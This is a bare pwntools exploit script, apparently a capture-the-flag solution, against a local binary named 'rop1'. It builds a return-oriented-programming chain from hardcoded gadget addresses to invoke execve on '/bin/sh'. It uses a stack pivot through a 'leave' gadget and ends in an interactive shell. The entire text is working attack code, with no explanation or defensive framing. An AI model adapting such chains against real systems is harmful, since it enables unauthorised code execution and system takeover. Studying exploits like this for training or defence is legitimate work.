#!/usr/bin/env python
from pwn import *

mao = process('./rop1')

context.arch = 'amd64'

pop_rdi = 0x401516
pop_rdx_rsi = 0x442909
pop_rax = 0x42678b
leave = 0x4009e4
syscall = 0x4672b5
buf = 0x6ccd60

payload = flat([buf, pop_rdx_rsi, 0, 0, pop_rax, 0x3b, pop_rdi, buf, syscall])
mao.sendline('/bin/sh\x00'.ljust(16,'\x00')+payload)

mao.recvuntil('\n')

p2load = 'A'*0x20
p2load += flat([buf+16, leave])
mao.sendline(p2load)

mao.interactive()

